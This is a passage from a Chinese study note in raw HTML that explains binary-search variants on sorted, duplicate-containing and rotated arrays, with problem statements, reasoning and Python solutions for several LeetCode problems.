class="token punctuation">(</span>target<span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            right<span class="token operator">=</span>mid<span class="token number">-1</span>    <span class="token keyword">return</span> left<span class="token comment" spellcheck="true">#或者为mid+1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-2-剑指-Offer-53-II-0～n-1中缺失的数字"><a href="#1-2-剑指-Offer-53-II-0～n-1中缺失的数字" class="headerlink" title="1.2  剑指 Offer 53 - II. 0～n-1中缺失的数字"></a>1.2  <a href="https://leetcode-cn.com/problems/que-shi-de-shu-zi-lcof/">剑指 Offer 53 - II. 0～n-1中缺失的数字</a></h3><h4 id="题目描述："><a href="#题目描述：" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h4><p>一个长度为n-1的递增排序数组中的所有数字都是唯一的，并且每个数字都在范围0～n-1之内。在范围0～n-1内的n个数字中有且只有一个数字不在该数组中，请找出这个数字。</p><p> <strong>示例 1:</strong></p><pre><code>输入: [0,1,3]输出: 2</code></pre><p><strong>示例 2:</strong></p><pre><code>输入: [0]输出: 1</code></pre><h4 id="解题思路"><a href="#解题思路" class="headerlink" title="解题思路"></a><strong>解题思路</strong></h4><p>与leetcode35搜索插入位置有点子像，这里把Target想象成mid</p><p>在数组中找到mid！=nums[mid]，并返回mid插入数组中的位置。</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">missingNumber</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type nums: List[int]        :rtype: int        """</span>        left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>            mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">!=</span>mid<span class="token punctuation">)</span><span class="token punctuation">:</span>                right<span class="token operator">=</span>mid<span class="token number">-1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">return</span> left<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="1-3-LTD69-x-的平方根"><a href="#1-3-LTD69-x-的平方根" class="headerlink" title="1.3 LTD69. x 的平方根"></a>1.3 <a href="https://leetcode-cn.com/problems/sqrtx/">LTD69. x 的平方根</a></h3><h4 id="题目描述：-1"><a href="#题目描述：-1" class="headerlink" title="题目描述："></a>题目描述：</h4><p>实现 <code>int sqrt(int x)</code> 函数:计算并返回 <em>x</em> 的平方根，其中 <em>x</em> 是非负整数。由于返回类型是整数，结果只保留整数的部分，小数部分将被舍去。</p><p><strong>示例 1:</strong></p><pre><code>输入: 4输出: 2</code></pre><p><strong>示例 2:</strong></p><pre><code>输入: 8输出: 2说明: 8 的平方根是 2.82842...,      由于返回类型是整数，小数部分将被舍去。</code></pre><h4 id="解题思路-1"><a href="#解题思路-1" class="headerlink" title="解题思路"></a>解题思路</h4><p>用二分法判断，初始区间为[0,x]，然后不断的找最大的mid使得mid*mid&lt;=即可，即ans=mid。</p><h4 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h4><pre><code>class Solution(object):    def mySqrt(self, x):        &quot;&quot;&quot;        :type x: int        :rtype: int        &quot;&quot;&quot;        left,right,ans=0,x,-1        while left&lt;=right:            mid=left+(right-left)//2            if mid*mid&lt;=x:                ans=mid                left=mid+1            else:                right=mid-1        return ans</code></pre><h3 id="1-4-LTD50-Pow-x-n"><a href="#1-4-LTD50-Pow-x-n" class="headerlink" title="1.4 LTD50. Pow(x, n)"></a>1.4 <a href="https://leetcode-cn.com/problems/powx-n/">LTD50. Pow(x, n)</a></h3><p>题目描述</p><p>实现 <a href="https://www.cplusplus.com/reference/valarray/pow/">pow(<em>x</em>, <em>n</em>)</a> ，即计算 x 的 n 次幂函数（即，xn）。</p><p> <strong>示例 1：</strong></p><pre><code>输入：x = 2.00000, n = 10输出：1024.00000</code></pre><p>More:</p><p><a href="https://leetcode-cn.com/problems/first-bad-version/">第一个错误的版本</a></p><p><a href="https://leetcode-cn.com/problems/guess-number-higher-or-lower/">猜数字大小</a></p><h2 id="变形2-有序数组-但是有重复值"><a href="#变形2-有序数组-但是有重复值" class="headerlink" title="变形2 有序数组 但是有重复值"></a>变形2 有序数组 但是有重复值</h2><h3 id="2-1-LTD-34在排序数组中查找元素的第一个和最后一个位置"><a href="#2-1-LTD-34在排序数组中查找元素的第一个和最后一个位置" class="headerlink" title="2.1  LTD 34在排序数组中查找元素的第一个和最后一个位置"></a>2.1  <a href="https://leetcode-cn.com/problems/find-first-and-last-position-of-element-in-sorted-array/">LTD 34在排序数组中查找元素的第一个和最后一个位置</a></h3><h4 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a><strong>题目描述</strong></h4><p>给定一个按照升序排列的整数数组 nums，和一个目标值 target。找出给定目标值在数组中的开始位置和结束位置。</p><p>如果数组中不存在目标值 target，返回 [-1, -1]。</p><p>示例 1：</p><p>输入：nums = [5,7,7,8,8,10], target = 8<br>输出：[3,4]</p><p>示例 2：</p><p>输入：nums = [], target = 0<br>输出：[-1,-1]</p><h4 id="思路1："><a href="#思路1：" class="headerlink" title="思路1："></a><strong>思路1：</strong></h4><p>我们只需在这段代码中修改即可，nums[mid] == target 时则返回，nums[mid] &lt; target 时则移动左指针，在右区间进行查找， nums[mid] &gt; target时则移动右指针，在左区间内进行查找。</p><p>计算下边界时，当 target &lt;= nums[mid] 时，right = mid -1；target &gt; nums[mid] 时，left = mid + 1；</p><p>计算上边界时，当 target &lt; nums[mid] 时，right = mid -1; target &gt;= nums[mid] 时 left = mid + 1;刚好和计算下边界时条件相反，返回right。</p><h4 id="代码："><a href="#代码：" class="headerlink" title="代码："></a><strong>代码：</strong></h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binarySearchbyLt32</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>    upper<span class="token operator">=</span>upperBound<span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span>    lower<span class="token operator">=</span>lowerBound<span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>lower<span class="token operator">></span>upper<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#不存在的情况</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>    <span class="token keyword">else</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token punctuation">[</span>lower<span class="token punctuation">,</span>upper<span class="token punctuation">]</span><span class="token comment" spellcheck="true">#计算下边界</span><span class="token keyword">def</span> <span class="token function">lowerBound</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#记得加这个判断条件</span>        mid<span class="token operator">=</span>left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">//</span><span class="token number">2</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">></span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">&lt;=</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#相等依然往左边，移动右指针往左</span>            right<span class="token operator">=</span>mid<span class="token number">-1</span>    <span class="token keyword">return</span> left<span class="token comment" spellcheck="true">#返回left</span><span class="token comment" spellcheck="true">#计算上边界</span><span class="token keyword">def</span> <span class="token function">upperBound</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#记得加这个判断条件</span>        mid<span class="token operator">=</span>left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">//</span><span class="token number">2</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">>=</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#相等依然往右边，移动左指针往右</span>            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            right<span class="token operator">=</span>mid<span class="token number">-1</span>    <span class="token keyword">return</span> right<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="思路2：推荐，复用代码"><a href="#思路2：推荐，复用代码" class="headerlink" title="思路2：推荐，复用代码"></a><strong>思路2：</strong>推荐，复用代码</h4><p><strong>左边界：</strong>返回left，即为第一个等于target的索引</p><p><strong>右边界：</strong>即为taget+1的左边界-1：最后一个等于target的索引=第一个等于target+1的索引-1</p><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Solution</span><span class="token punctuation">(</span>object<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">search</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> nums<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token triple-quoted-string string">"""        :type nums: List[int]        :type target: int        :rtype: List[int]        """</span>        <span class="token keyword">def</span> <span class="token function">leftBound</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>            left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>            <span class="token comment" spellcheck="true">#计算左边界</span>            <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>                mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>                <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">&lt;=</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    right<span class="token operator">=</span>mid<span class="token number">-1</span>                <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">></span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                    left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">return</span> left        left<span class="token operator">=</span>leftBound<span class="token punctuation">(</span>nums<span class="token punctuation">,</span>target<span class="token punctuation">)</span>        right<span class="token operator">=</span>leftBound<span class="token punctuation">(</span>nums<span class="token punctuation">,</span>target<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>right<span class="token operator">&lt;</span>left<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">]</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> <span class="token punctuation">[</span>left<span class="token punctuation">,</span>right<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-2-找出第一个大于目标元素的索引"><a href="#2-2-找出第一个大于目标元素的索引" class="headerlink" title="2.2  找出第一个大于目标元素的索引"></a>2.2  找出第一个大于目标元素的索引</h3><h4 id="题目描述：-2"><a href="#题目描述：-2" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h4><p>找出第一个大于目标元素的索引，若找不到目标元素，则返回-1</p><p>1.数组包含目标元素，找出在他后面的第一个元素</p><p>2.目标元素不在数组中，数组内的部分元素大于它，此时我们需要返回第一个大于他的元素</p><p>3.目标元素不在数组中，且数组中的所有元素都大于它，那么我们此时返回数组的第一个元素即可</p><p>4.目标元素不在数组中，且数组中的所有元素都小于它，那么我们此时没有查询到，返回 -1 即可。</p><p>示例 1：</p><p>输入：nums =[1,3,5,5,6,6,8,9,11], target = 5<br>输出：4</p><p>示例 2：</p><p>输入：nums =[1,3,5,5,6,6,8,9,11], target = 4<br>输出：-1</p><h4 id="解题思路："><a href="#解题思路：" class="headerlink" title="解题思路："></a><strong>解题思路：</strong></h4><p>在leetcode 34题目基础上，找到右边界+1即可。</p><h4 id="代码：-1"><a href="#代码：-1" class="headerlink" title="代码："></a><strong>代码：</strong></h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">binarySearchbyFirstUpIndex</span><span class="token punctuation">(</span>arr<span class="token punctuation">,</span>target<span class="token punctuation">,</span>left<span class="token punctuation">,</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#记得加这个判断条件</span>        mid<span class="token operator">=</span>left <span class="token operator">+</span> <span class="token punctuation">(</span>right <span class="token operator">-</span> left<span class="token punctuation">)</span> <span class="token operator">//</span><span class="token number">2</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">>=</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#相等依然往右边</span>            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">elif</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>arr<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>mid<span class="token operator">==</span><span class="token number">0</span><span class="token operator">|</span>target<span class="token operator">></span>arr<span class="token punctuation">[</span>mid<span class="token number">-1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>                <span class="token keyword">return</span> mid            <span class="token keyword">else</span><span class="token punctuation">:</span>                right<span class="token operator">=</span>mid<span class="token number">-1</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="2-3-找出最后一个小于目标元素的索引"><a href="#2-3-找出最后一个小于目标元素的索引" class="headerlink" title="2.3 找出最后一个小于目标元素的索引"></a>2.3 找出最后一个小于目标元素的索引</h3><h4 id="题目描述：-3"><a href="#题目描述：-3" class="headerlink" title="题目描述："></a>题目描述：</h4><p>nums = {1,3,5,5,6,6,8,9,11} target = 7</p><h4 id="解题思路：-1"><a href="#解题思路：-1" class="headerlink" title="解题思路："></a>解题思路：</h4><pre class="line-numbers language-python"><code class="language-python"><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h2 id="变形3-不完全有序-不含重复值"><a href="#变形3-不完全有序-不含重复值" class="headerlink" title="变形3  不完全有序 不含重复值"></a>变形3  不完全有序 不含重复值</h2><h3 id="3-1-LTD33-搜索旋转排序数组—查找目标元素（不含重复元素）"><a href="#3-1-LTD33-搜索旋转排序数组—查找目标元素（不含重复元素）" class="headerlink" title="3.1 LTD33 搜索旋转排序数组—查找目标元素（不含重复元素）"></a>3.1 <a href="https://leetcode-cn.com/problems/search-in-rotated-sorted-array/">LTD33 搜索旋转排序数组—查找目标元素（不含重复元素）</a></h3><h4 id="题目描述：-4"><a href="#题目描述：-4" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h4><p>整数数组 <code>nums</code> 按升序排列，数组中的值 <strong>互不相同</strong> 。</p><p>在传递给函数之前，<code>nums</code> 在预先未知的某个下标 <code>k</code>（<code>0 &lt;= k &lt; nums.length</code>）上进行了 <strong>旋转</strong>，使数组变为 <code>[nums[k], nums[k+1], ..., nums[n-1], nums[0], nums[1], ..., nums[k-1]]</code>（下标 <strong>从 0 开始</strong> 计数）。例如， <code>[0,1,2,4,5,6,7]</code> 在下标 <code>3</code> 处经旋转后可能变为 <code>[4,5,6,7,0,1,2]</code> 。</p><p>给你 <strong>旋转后</strong> 的数组 <code>nums</code> 和一个整数 <code>target</code> ，如果 <code>nums</code> 中存在这个目标值 <code>target</code> ，则返回它的下标，否则返回 <code>-1</code> 。</p><p> <strong>示例 1：</strong></p><pre><code>输入：nums = [4,5,6,7,0,1,2], target = 0输出：4</code></pre><p><strong>示例 2：</strong></p><pre><code>输入：nums = [4,5,6,7,0,1,2], target = 3输出：-1</code></pre><p><strong>示例 3：</strong></p><pre><code>输入：nums = [1], target = 0输出：-1</code></pre><h4 id="解题思路：-2"><a href="#解题思路：-2" class="headerlink" title="解题思路："></a>解题思路：</h4><p>当我们将数组从中间分开成左右两部分的时候，首先需要判断mid的位置；然后判断target的位置；所以2x2=4,会有四种组合</p><p><strong>第一步：判断mid的位置：</strong></p><p>可以发现的是，我们将数组从中间分开成左右两部分的时候，一定有一半的数组是有序的。拿示例来看，我们从 6 这个位置分开以后数组变成了 [4, 5, 6] 和 [7, 0, 1, 2] 两个部分，其中左边 [4, 5, 6] 这个部分的数组是有序的，因为有序数组 ，我们就可以用到前面的二分查找。所以mid的位置就是两种情况：</p><p>（1）mid的左边是有序的，即[left,mid]有序，[mid,right]无序。我们可以使用num[mid]与num[left]做比较，可以得出当nums[mid]&gt;=nums[left]时候，mid的左边是有序数组。</p><p>​        <strong>第二步：判断target的位置</strong></p><p>​        前提条件：mid的左边是有序数组；现在我们来判断target的位置</p><p>​        a.当target落在mid的左边区域（target&lt;nums[mid] and target&gt;=nums[left]），即有序的，则right=mid-1;往左查找。这时候注意target需要包含=num[left]的情况。</p><p>​        b.当target落在mid的右边无序区域，需要往右查找：left=mid+1</p><p>（2）mid的右边是有序的，即[left,mid]无序，[mid,right]有序。可以得出当nums[mid]&lt;nums[left]时候，mid的右边是有序数组。其实我们只分析一种情况，另外一种可以直接用else。</p><p>​        <strong>第二步：判断target的位置</strong></p><p>​        前提条件：mid的右边是有序数组；现在我们来判断target的位置</p><p>​        a.当target落在mid的右边有序区域（target&gt;nums[mid] and target&lt;nums[left]），则left=mid+1;往右查找。其实这个条件与（1）.a的条件是相反的。</p><p>​        b.当target落在mid的左边无序区域，需要往左查找：right=mid-1</p><h4 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">BinarySearchIndisOrder</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> target<span class="token punctuation">)</span><span class="token punctuation">:</span>    left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>left<span class="token operator">&lt;=</span>right<span class="token punctuation">)</span><span class="token punctuation">:</span>        mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>        <span class="token comment" spellcheck="true">#step1 判断mid的位置</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">==</span>target<span class="token punctuation">)</span><span class="token punctuation">:</span>            <span class="token keyword">return</span> mid        <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">>=</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]有序</span>            <span class="token comment" spellcheck="true">#step2 判断target的位置</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">and</span> target<span class="token operator">>=</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment" spellcheck="true">#target在左边</span>                right<span class="token operator">=</span>mid<span class="token number">-1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>        <span class="token keyword">else</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]无序，[mid,right]有序</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>target<span class="token operator">></span>nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span> <span class="token operator">and</span> target<span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#target在右边</span>                left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>            <span class="token keyword">else</span><span class="token punctuation">:</span>                right<span class="token operator">=</span>mid<span class="token number">-1</span>    <span class="token keyword">return</span> <span class="token operator">-</span><span class="token number">1</span><span class="token comment" spellcheck="true">#没有查到</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂度分析"><a href="#复杂度分析" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p>时间复杂度：O(logn)，其中 nn 为nums 数组的大小。整个算法时间复杂度即为二分查找的时间复杂度 O(log n)O(logn)。</p><p>空间复杂度： O(1)O(1) 。我们只需要常数级别的空间存放变量。</p><h3 id="3-2-LTD153-寻找旋转排序数组中的最小值-不含重复值"><a href="#3-2-LTD153-寻找旋转排序数组中的最小值-不含重复值" class="headerlink" title="3.2 LTD153 寻找旋转排序数组中的最小值  不含重复值"></a>3.2 <a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array/">LTD153 寻找旋转排序数组中的最小值</a>  不含重复值</h3><h4 id="题目描述：-5"><a href="#题目描述：-5" class="headerlink" title="题目描述："></a><strong>题目描述：</strong></h4><p>已知一个长度为 n 的数组，预先按照升序排列，经由 1 到 n 次 旋转 后，得到输入数组。例如，原数组 nums = [0,1,2,4,5,6,7] 在变化后可能得到：<br>若旋转 4 次，则可以得到 [4,5,6,7,0,1,2]<br>若旋转 7 次，则可以得到 [0,1,2,4,5,6,7]<br>注意，数组 [a[0], a[1], a[2], …, a[n-1]] 旋转一次 的结果为数组 [a[n-1], a[0], a[1], a[2], …, a[n-2]] 。</p><p>给你一个元素值 互不相同 的数组 nums ，它原来是一个升序排列的数组，并按上述情形进行了多次旋转。请你找出并返回数组中的 最小元素 。</p><p> 示例 1：</p><p>输入：nums = [3,4,5,1,2]<br>输出：1<br>解释：原数组为 [1,2,3,4,5] ，旋转 3 次得到输入数组。<br>示例 2：</p><p>输入：nums = [11,13,15,17]<br>输出：11<br>解释：原数组为 [11,13,15,17] ，旋转 4 次得到输入数组。</p><h4 id="解题思路-2"><a href="#解题思路-2" class="headerlink" title="解题思路"></a>解题思路</h4><p>寻找最小值，只需要比较mid和right的值即可，<a href="https://leetcode-cn.com/problems/find-minimum-in-rotated-sorted-array/solution/er-fen-cha-zhao-wei-shi-yao-zuo-you-bu-dui-cheng-z/">原因见为什么比较右边界</a>。</p><p>（1）当中间值比右边值小的时候（nums[mid]&lt;nums[right]），则往左边找，因为此时nums[mid]有可能是最小值，因此right=mid而不是right=mid-1,因为mid-1会错过最小值nums[mid]</p><p>（2）当中间值比右边大的时候（nums[mid]&gt;nums[right]），则往右找，此时nums[mid]肯定不是最小值，所以left=left+1;</p><p>（3）因为是无重复数组，所以不存在nums[mid]==nums[right]</p><h4 id="代码-2"><a href="#代码-2" class="headerlink" title="代码"></a>代码</h4><pre class="line-numbers language-python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">findMin</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token triple-quoted-string string">"""    :type nums: List[int]    :rtype: int    """</span>    left<span class="token punctuation">,</span>right<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">,</span>len<span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token operator">-</span><span class="token number">1</span>    <span class="token keyword">while</span> left<span class="token operator">&lt;</span>right<span class="token punctuation">:</span>        mid<span class="token operator">=</span>left<span class="token operator">+</span><span class="token punctuation">(</span>right<span class="token operator">-</span>left<span class="token punctuation">)</span><span class="token operator">//</span><span class="token number">2</span>        <span class="token keyword">if</span> nums<span class="token punctuation">[</span>mid<span class="token punctuation">]</span><span class="token operator">&lt;</span>nums<span class="token punctuation">[</span>right<span class="token punctuation">]</span><span class="token punctuation">:</span><span class="token comment" spellcheck="true">#[left,mid]有序</span>            <span class="token comment" spellcheck="true"># 如果中间值小于最大值，则最大值减小</span>            <span class="token comment" spellcheck="true"># 疑问：为什么</span>            <span class="token comment" spellcheck="true"># high = mid;</span>            <span class="token comment" spellcheck="true"># 而不是</span>            <span class="token comment" spellcheck="true"># high = mid - 1;</span>            <span class="token comment" spellcheck="true"># 解答：&amp;#123;4, 5, 1, 2, 3&amp;#125;，如果high = mid - 1，则丢失了最小值1</span>            right<span class="token operator">=</span>mid<span class="token comment" spellcheck="true">#如果mid是最小值 则right=mid-1会错过最小值</span>        <span class="token keyword">else</span><span class="token punctuation">:</span>            <span class="token comment" spellcheck="true"># 如果中间值大于最大值，则最小值变大</span>            <span class="token comment" spellcheck="true">#疑问：为什么</span>            <span class="token comment" spellcheck="true"># low = mid + 1;</span>            <span class="token comment" spellcheck="true"># 而不是</span>            <span class="token comment" spellcheck="true"># low = mid;</span>            <span class="token comment" spellcheck="true"># 解答：&amp;#123;4, 5, 6, 1, 2, 3&amp;#125;，nums[mid] = 6，low = mid + 1, 刚好nums[low] = 1</span>            <span class="token comment" spellcheck="true">#继续疑问：上边的解释太牵强了，难道没有可能low = mid + 1, 正好错过了最小值</span>            <span class="token comment" spellcheck="true">#继续解答：不会错过!!! 因为nums[mid]>=nums[right],所以nums[mid]一定不是最小值</span>            left<span class="token operator">=</span>mid<span class="token operator">+</span><span class="token number">1</span>    <span class="token keyword">return</span> nums<span class="token punctuation">[</span>left<span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="复杂度分析-1"><a href="#复杂度分析-1" class="headerlink" title="复杂度分析"></a>复杂度分析</h4><p>log(n)</p><h1 id="变形4-不完全有序-含重复值"><a href="#变形4-不完全有序-含重复值" class="headerlink" title="变形4  不完全有序 含重复值"></a>变形4  不完全有序 含重复值</h1><h3 id="4-1-LTD81搜索旋转排序数组-II-含重复值"><a href="#4-1-LTD81搜索旋转排序数组-II-含重复值" class="headerlink" title="4.1 LTD81搜索旋转排序数组 II 